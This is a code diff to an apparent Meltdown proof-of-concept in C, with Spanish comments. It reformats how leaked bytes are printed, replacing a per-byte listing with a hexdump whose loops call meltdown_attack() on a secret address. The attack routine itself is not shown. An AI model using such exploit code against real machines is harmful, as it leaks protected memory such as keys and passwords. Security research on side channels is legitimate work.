@@ -75,9 +75,32 @@ int main(int argc, char *argv[]) {
 
     printf("[+] Leyendo %d bytes desde %p...\n", num_bytes, secret);
 
-    for (int i = 0; i < num_bytes; i++) {
-        meltdown_attack(secret + i, probe_array);
-        printf("0x%02x (%c)\n", leaked_value, (leaked_value >= 32 && leaked_value <= 126) ? leaked_value : '.');
+    for (int i = 0; i < num_bytes; i += 16) {
+        printf("%08lx: | ", (unsigned long)(secret + i));
+
+        // Parte izquierda: bytes en hexadecimal
+        for (int j = 0; j < 16; j++) {
+            if (i + j < num_bytes) {
+                meltdown_attack(secret + i + j, probe_array);
+                printf("%02x ", leaked_value);
+            } else {
+                printf("   ");
+            }
+        }
+
+        printf("| ");
+
+        // Parte derecha: caracteres ASCII
+        for (int j = 0; j < 16; j++) {
+            if (i + j < num_bytes) {
+                meltdown_attack(secret + i + j, probe_array);
+                printf("%c", (leaked_value >= 32 && leaked_value <= 126) ? leaked_value : '.');
+            } else {
+                printf(" ");
+            }
+        }
+
+        printf(" |\n");
     }
 
     return 0;
